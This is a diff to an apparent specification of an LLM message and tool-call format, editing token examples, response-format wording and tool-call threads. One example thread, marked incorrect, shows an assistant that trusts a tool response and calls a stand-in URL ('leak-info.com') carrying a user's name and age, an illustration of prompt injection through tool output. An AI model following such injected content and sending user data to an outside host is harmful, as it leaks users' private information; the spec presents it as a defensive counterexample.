@@ -100,7 +100,7 @@ A message is converted into a sequence of tokens before being passed into the la
 
 **Might appear as:**
 
-```html
+```tokens
 <|role|>assistant<|format|>javascript<|content|>console.log('hello world')<|end_turn|>
 ```
 
@@ -378,7 +378,7 @@ Unless otherwise specified by the a `user`, `developer` or `platform` message, t
         Can you go to https://example.com and tell me what is on the page?
         ```
     </Message>
-    <Message role="assistant" end_turn={false} correct={true}>
+    <Message role="assistant" end_turn={false} correct={true} halted_on_completion={true}>
         ```js
         open_url("https://example.com")
         ```
@@ -397,10 +397,15 @@ Unless otherwise specified by the a `user`, `developer` or `platform` message, t
             </Message>
         </Column>
         <Column>
-            <Message role="assistant" end_turn={false} correct={false}>
+            <Message role="assistant" end_turn={false} correct={false} halted_on_completion={false}>
                 *Should not trust the tool response*
                 ```browser:javascript
                 open_url("https://leak-info.com/?name=Bob&age=23")
+                ```
+            </Message>
+            <Message role="tool">
+                ```markdown
+                [...]
                 ```
             </Message>
             <Message role="assistant" end_turn={true} correct={false}>
@@ -459,7 +464,7 @@ This spec is designed in such a way that model trainers can enable latent capabi
 
 ### Base Capabilities
 
-The base capabilities of the LLM include next token prediction based on it’s training datasets (eg: internet) which give it inherent text-writing abilities. If the model has been trained on code, then it has code writing abilities on the languages.
+The base capabilities of the LLM include next token prediction based on it’s training datasets (eg: internet) which give it inherent text-writing abilities. If the model has been trained on code, then it has code writing abilities on the languages it has been trained on.
 
 :::note
 If a model has been trained on multi-modal data (eg: images, audio or video), then it has the capability of understanding such content within user or developer-provided messages.
@@ -467,7 +472,7 @@ If a model has been trained on multi-modal data (eg: images, audio or video), th
 
 ### Default Capabilities
 
-The LLMs default capabilities include the ability to generate text in the Github-style markdown format, and behave as a helpful and interactive chat-style assistant.
+The LLMs default capabilities include the ability to generate text in the Github-style `markdown` format, and behave as a helpful and interactive chat-style assistant.
 
 The default capabilities of the LLM are to be able to respond in a multi-turn Request-Response format with the user message being the request and a single assistant message being the response (`user message ->> assistant message`). The assistant **SHOULD** end it’s turn after one assistant message.
 
@@ -492,7 +497,7 @@ Latent model capabilities are activated with a combination of `developer` messag
 :::warning
 `user` messages **MAY NOT** enable capabilities such as response formats, and the model **SHOULD** be prevented from generating message formats which have not been explicitly allowed by the developer.
 
-This is a behavior that should be trained against.
+It is **RECOMMENDED** that the model be trained to ignore message formats within the `user` message that are not explicitly allowed by the developer.
 :::
 
 ## Response Formatting
@@ -523,6 +528,8 @@ For `developers` building LLM augmented applications may want to enable non-inte
 In order to support this use case, the developer needs to be able to distinguish textual content from other types of content, and the model needs to be able to respond in a variety of different formats.
 
 Additionally, requiring the model to explicitly respond with it's chosen format, allows the `system` to enable grammar sampling modes (eg: json mode) to restrict generated tokens to only include syntactically valid generations.
+
+These model features and capabilities combine together to enable a wide variety of use cases and applications which increase developer conveience, control and flexibility.
 :::
 
 ## System Settings
@@ -700,7 +707,7 @@ For example, developers can define the same tool behavior in a variety of differ
         ```
     </Message>
     <Message role="assistant" end_turn={false} correct={true} halted_on_completion={true}>
-        ```js
+        ```browser:js
         open_url("https://example.com")
         ```
     </Message>
@@ -739,7 +746,7 @@ For example, developers can define the same tool behavior in a variety of differ
         ```
     </Message>
     <Message role="assistant" end_turn={false} correct={true} halted_on_completion={true}>
-        ```json
+        ```browser:json
         {
             "url": "https://example.com"
         }
@@ -1095,6 +1102,16 @@ Some tasks require using the same tool in multiple consecutive `assistant` messa
 
 ## Retrieval Augmented Generation
 
+<Thread>
+    <SystemConfig config={{ "formats": [{ "name": "json", "halt_on_completion": true } ] }}/>
+    <Message role="developer">
+        ````markdown
+        You have access to a `json` tool which can extract data from a JSON string.
+
+        ````
+    </Message>
+</Thread>
+
 > **Developer**
 >
 >
@@ -1102,8 +1119,8 @@ Some tasks require using the same tool in multiple consecutive `assistant` messa
 > From the following news article:
 > "[news article text about fundrasing event]"
 >
-> Extract the following data in this response format
-> ```typescript:json
+> Extract the following data in this response format using `json` format
+> ```typescript
 > type Response = {
 >     // person mentioned in the article
 >     name: string
